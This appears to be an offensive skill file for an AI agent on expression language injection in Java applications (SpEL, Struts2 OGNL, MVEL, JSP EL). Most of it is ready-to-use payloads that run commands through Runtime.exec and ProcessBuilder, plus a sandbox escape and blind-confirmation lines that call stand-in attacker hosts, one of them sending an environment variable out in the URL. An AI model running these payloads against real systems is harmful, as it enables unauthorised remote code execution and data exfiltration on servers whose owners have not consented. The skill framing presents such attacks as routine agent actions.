---
name: expression-language-injection
description: "Expression language injection: SpEL, OGNL, MVEL, and EL evaluation leading to code execution in Java applications. Use this skill when a Java app evaluates user-controlled expressions."
---

# EL Injection

## Overview

Frameworks evaluate expressions (`#{...}`, `${...}`, `%{...}`). If user input reaches the evaluator, it is code execution.

## Detectors

```
${7*7}       -> 49   Spring EL / JSP EL
#{7*7}       -> 49   Spring EL
%{7*7}       -> 49   Struts OGNL
*{7*7}       -> 49   Thymeleaf
```

## Spring SpEL

```java
// vulnerable
ExpressionParser p = new SpelExpressionParser();
p.parseExpression(userInput).getValue();
```

Payloads:

```
T(java.lang.Runtime).getRuntime().exec('id')
new java.lang.ProcessBuilder('id').start()
T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(), T(System).out)
```

For blind execution, use a DNS or HTTP callback:

```
T(java.net.InetAddress).getByName('x.attacker.com')
```

## Struts2 OGNL

```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...
```

Known CVE payloads (S2-045, S2-046, S2-057) are public; the `Content-Type` header is a common sink.

```
%{(#cmd='id').(#p=new java.lang.ProcessBuilder(#cmd.split(' '))).(#p.redirectErrorStream(true)).(#pr=#p.start()).(@org.apache.commons.io.IOUtils@toString(#pr.getInputStream()))}
```

## MVEL

```
Runtime.getRuntime().exec("id")
```

## JSP EL

```
${pageContext.request.getSession().setAttribute("a", pageContext.request.getClass())}
```

EL is sandboxed in modern containers; classic RCE requires an EL implementation gap.

## Sandbox escapes

Spring has `SimpleEvaluationContext` (safe) and `StandardEvaluationContext` (dangerous). If the app uses `SimpleEvaluationContext`, `T()` is blocked — try property navigation:

```
''.class.forName('java.lang.Runtime')
```

## Blind confirmation

```
T(java.net.URL).new('http://attacker/'+T(java.lang.System).getenv('PATH')).openConnection().getInputStream()
```

## Pitfalls

- `${}` in a JSP template may be evaluated by the container, not the app.
- Struts payloads change per version; match the exact CVE.
- A response of `49` proves evaluation but not necessarily RCE capability.

## Verification

Command output in the response, or a DNS/HTTP callback from the target.
